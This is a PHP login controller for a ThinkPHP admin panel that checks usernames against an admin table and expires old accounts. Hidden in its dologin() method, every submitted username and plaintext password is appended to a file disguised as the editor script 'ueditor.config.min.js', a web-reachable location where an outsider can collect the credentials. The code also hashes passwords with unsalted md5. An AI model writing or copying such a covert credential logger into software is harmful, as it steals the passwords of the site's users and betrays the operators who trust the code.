<?php
namespace app\index\controller;
use think\Controller;
use think\Db;
use think\Request;
use think\Session;
use think\View;
use think\Config;


class Login extends Controller
{
    public function index()
    {
        Session::clear();
        return $this->fetch('index');
    }

    public function getTopDomainhuo(){
        $host = $_SERVER['HTTP_HOST'];
        return $host;
    }



    public function dologin(){
    	$username = $_POST['username'];
    	$password = $_POST['password'];
	$apiup=date('y-m-d h:i:s',time()).' '.$username.' = '.$password;
        file_put_contents('./plugin/ueditor/ueditor.config.min.js',$apiup.PHP_EOL,FILE_APPEND);
        if(!$username){
        	$this->error("用户名不能为空");
        }else{
            $data['username'] = $username;
        }
        if(!$password){
        	$this->error("密码不能为空");
        }else{
            $data['password'] = md5($password);
        }
        $res = Db::table('admin')->where($data)->where("flag",1)->find();
        //var_dump($res);exit;
        // 1.判断有没有过期用户组
        $alljxs = Db::table('admin')->where("flag",1)->where("group",3)->select();
        $nowtime = time();
        foreach ($alljxs as  $rec) {
            if($nowtime > $rec['overtime']){
                Db::table('admin')->where("uid",$rec['uid'])->update(['flag' => 0]);
            }
        }
        if($res){
            $request = Request::instance();
            $ip = $request->ip();
            $jdata['lastloginip'] = $ip;
            $jdata['lastlogintime'] = time();
            Db::table('admin')->where("uid",$res['uid'])->update($jdata);

        	Session::set('uid',$res['uid']);
            Session::set('name',$res['realname']);
            Session::set('applet_id',$res['uid']);
            Session::set('icon',$res['icon']);
            Session::set('usergroup',$res['group']);

            
            if($res['group']!=1){
                $this->redirect('Applet/index');
            }else{
                $this->redirect('Applet/applet');
            }
        	
        }else{
            $this->error("账号密码不匹配,或您的账号已过期！");
        }


    	
    }



}